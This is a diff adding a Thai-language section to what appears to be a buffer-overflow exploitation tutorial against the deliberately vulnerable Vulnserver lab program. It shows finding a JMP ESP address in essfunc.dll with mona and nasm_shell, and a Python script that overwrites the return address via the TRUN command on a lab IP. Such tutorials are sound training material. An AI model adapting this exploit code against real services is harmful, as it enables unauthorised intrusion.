@@ -1721,6 +1721,77 @@ while True:
 <<<<<<<<<< RESULT >>>>>>>>>>
 
 ## Finding the Right Mudule
+- [Mona modules](https://github.com/corelan/mona)
+  - ให้ตรวจสอบ Path "C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands" บน Windows ที่ติดตั้ง Immunity Debugger ไว้ว่ามีไฟล์ชื่อ Mona.py หรือไม่ 
+
+![](./imag/../img/Findmodulemona.jpg)
+
+- พิมพ์ !mona modules บริเวรช่องใส่ช้อความด้านล่างบน Immunity
+
+![](./imag/../img/Findmodulemona2.jpg)
+
+- การตรวจสอบ Modules นั้น จำเป็นต้องเข้าใจก่อนว่า Hex Code ของการไปยัง Pointer ESP คืออะไร? ทั้งนี้ บน Kali linux จะมี nasm_shell ที่ทำหน้าที่แปลงค่าของคำสั่ง Assembly ให้อยู่ในรูปแบบของ hex โดยจะทำการค้นหาตำแหน่งของ ESP ซึ่งเป็นจุดเริ่มต้นของ Code ที่จะทำการแทรก สามารถใช้คำสั่ง JMP ESP และทำให้เราทราบว่าคำสั่งดังกล่าวมี Hex code เป็น **“FFE4”** นั่นเอง 
+  
+```bash
+locate nasm_shell
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+
+#nasm promp 
+nasm > JMP ESP
+
+# Result 
+00000000  FFE4              jmp esp
+```
+
+จากนั้นกลับไปที่ Immunity Debugger เพื่อค้นหาตำแหน่งของ FFE4 หรือ JMP ESP โดยใช้คำสั่งดังนี้
+
+```bash
+!mona find -s “\xff\xe4" -m essfunc.dll
+```
+
+![](./imag/../img/Findmodulemona3.jpg)
+
+![](./imag/../img/Findmodulemona4.jpg)
+
+- จากรูปด้านบนจะเห็นค่า "625011af" ซึ่งเป็นตำแหน่งที่มีการ Jump ไปยัง ESP หรือเป็นจุดเริ่มต้นของฟังก์ชันที่มีช่องโหว่นั่นเอง
+- เราสามารถตรวจสอบความถูกต้องได้โดยการใช้โปรแกรม Immunity ค้นหาจุด "625011af" ตามภาพด้านล่าง 
+- จากนั้นเราสามารถกำหนด Breaking Point บน Immunity Debugger ได้โดยการกด F2 ตามภาพด้านล่าง
+
+![](./imag/../img/Findmodulemona5.jpg)
+
+- Result JMP ESP to essfunc.dll is 625011af บน x86 จะมีรูปแบบการเข้าถึงด้วย Endian Format ทำให้จะต้องแปลงข้อมูลจาก 625011af ให้อยู่ในรูปแบบ Endian Format ดังต่อไปนี้ \xaf\x11\x50\x62 # และการเก็บ Address ใน x86 จะเก็บข้อมูลใน Memory ในลักษณะของ low order bytes at the lowest address และ high order bytes at the highest address ทำให้เราจำเป็นต้องใส่ค่าแบบ Reverse นั้นเอง
+
+```python
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+shellcode = "A" * 2002 + "\xaf\x11\x50\x62"
+
+HOST = '192.168.56.101'
+PORT = 9999
+
+while True:
+  try:
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((HOST,PORT))
+    s.send(('TRUN /. :/' + shellcode))
+    s.close()
+  except:
+    print "Error Connection to Server"
+    sys.exit()
+
+```
+After run 
+
+![](./imag/../img/Findmodulemona6.jpg)
+
+<<<<<<<<<< RESULT >>>>>>>>>>
+
+**FIND Modules and ESP Point is 625011af** 
+  
+<<<<<<<<<< RESULT >>>>>>>>>>
+---
 ## Generating Shellcode and Gaining Root
 ## Exploit Development
 
